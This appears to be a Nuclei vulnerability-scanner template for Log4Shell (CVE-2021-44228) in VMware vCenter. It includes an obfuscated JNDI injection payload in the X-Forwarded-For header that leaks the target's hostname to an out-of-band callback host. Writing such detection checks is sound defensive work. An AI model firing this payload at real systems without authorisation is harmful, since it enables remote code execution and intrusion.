id: vmware-vcenter-log4j-jndi-rce
info:
  name: VMware VCenter - Remote Code Execution (Apache Log4j)
  author: _0xf4n9x_
  severity: critical
  description: VMware VCenter is vulnerable to remote code execution via Apache Log4j,
    allowing attackers to execute malware, access sensitive information, modify data,
    and gain full control over the system without authentication.
  reference:
  - https://www.vmware.com/security/advisories/VMSA-2021-0028.html
  - https://github.com/advisories/GHSA-jfh8-c2jp-5v3q
  - https://twitter.com/tnpitsecurity/status/1469429810216771589
  - https://logging.apache.org/log4j/2.x/security.html
  - https://nvd.nist.gov/vuln/detail/CVE-2021-44228
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
    cvss-score: 10
    cve-id: CVE-2021-44228
    cwe-id: CWE-77
  metadata:
    shodan-query: title:"VMware VCenter"
    impact: The impact of the VMware VCenter - Remote Code Execution vulnerability
      is severe as it allows attackers to gain unauthorized access and control over
      compromised systems without any credentials.
    recommendation: It is recommended to update VMware VCenter immediately to protect
      against the remote code execution vulnerability via the Apache Log4j framework.
  tags: cve,cve2021,rce,jndi,log4j,vcenter,vmware,oast,kev
requests:
- raw:
  - 'GET /websso/SAML2/SSO/vsphere.local?SAMLRequest= HTTP/1.1

    Host: {{Hostname}}

    X-Forwarded-For: ${jndi:${lower:d}n${lower:s}://${env:hostName}.{{interactsh-url}}}

    '
  matchers-condition: and
  matchers:
  - type: word
    part: interactsh_protocol
    words:
    - dns
  - type: regex
    part: interactsh_request
    regex:
    - ([a-zA-Z0-9\.\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+
  extractors:
  - type: regex
    part: interactsh_request
    group: 1
    regex:
    - ([a-zA-Z0-9\.\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+
